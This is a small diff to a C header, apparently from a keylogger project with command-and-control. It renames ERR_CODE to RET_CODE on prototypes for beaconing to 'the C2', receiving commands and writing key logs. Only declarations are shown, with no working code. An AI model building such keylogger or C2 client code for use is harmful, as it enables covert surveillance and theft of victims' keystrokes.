@@ -28,11 +28,11 @@ typedef struct {
 
 CLIENT_HANDLER* initClient();
 
-ERR_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey);
+RET_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey);
 
 // functions utilised by the worker threads!
-ERR_CODE pollCommandsAndBeacon(CLIENT_HANDLER* client); // beacon and recieve commands from the C2
-ERR_CODE writeKeyLog(CLIENT_HANDLER* client, KEY_LOGGER* kLogger);  // write 
+RET_CODE pollCommandsAndBeacon(CLIENT_HANDLER* client); // beacon and recieve commands from the C2
+RET_CODE writeKeyLog(CLIENT_HANDLER* client, KEY_LOGGER* kLogger);  // write 
 
 void clientCleanup(CLIENT_HANDLER* client);
 
